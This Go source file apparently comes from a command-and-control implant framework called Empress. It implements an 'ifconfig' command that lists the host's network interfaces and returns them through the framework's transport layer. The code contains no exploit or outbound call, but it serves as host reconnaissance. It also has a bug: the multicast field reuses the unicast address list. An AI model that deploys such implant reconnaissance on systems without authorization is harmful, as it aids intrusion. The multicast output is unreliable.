package net

import (
	"bytes"
	"fmt"
	"github.com/pygrum/Empress/transport"
	"net"
	"strings"
	"text/tabwriter"
)

func CmdIfconfig(req *transport.Request, response *transport.Response) {
	interfaces, err := net.Interfaces()
	if err != nil {
		transport.ResponseWithError(response, err)
		return
	}
	var b bytes.Buffer
	w := tabwriter.NewWriter(&b, 1, 1, 2, ' ', 0)
	rowFmt := "%s\t%s\t\n"
	for _, iface := range interfaces {
		valueFormat := `
%s
Flags=      <%s> 
MTU:        %d
Addresses:  %s
Multicast:  %s
MAC:        %s
Index:      %d
`
		name := iface.Name
		flags := iface.Flags.String()
		mtu := iface.MTU
		mac := iface.HardwareAddr
		index := iface.Index

		var addresses, multicastAddresses string
		addrs, err := iface.Addrs()
		if err == nil {
			var addArray []string
			for _, a := range addrs {
				addArray = append(addArray, a.String())
			}
			addresses = strings.Join(addArray, " | ")
		}
		multi, err := iface.Addrs()
		if err == nil {
			var addArray []string
			for _, m := range multi {
				addArray = append(addArray, m.String())
			}
			multicastAddresses = strings.Join(addArray, " | ")

		}
		_, _ = fmt.Fprintln(w, fmt.Sprintf(rowFmt, name, fmt.Sprintf(valueFormat,
			strings.Repeat("=", len(name)), flags, mtu, addresses, multicastAddresses, mac, index)))
	}
	_ = w.Flush()
	transport.AddResponse(response, transport.ResponseDetail{
		Status: transport.StatusSuccess,
		Dest:   transport.DestStdout,
		Data:   b.Bytes(),
	})
}
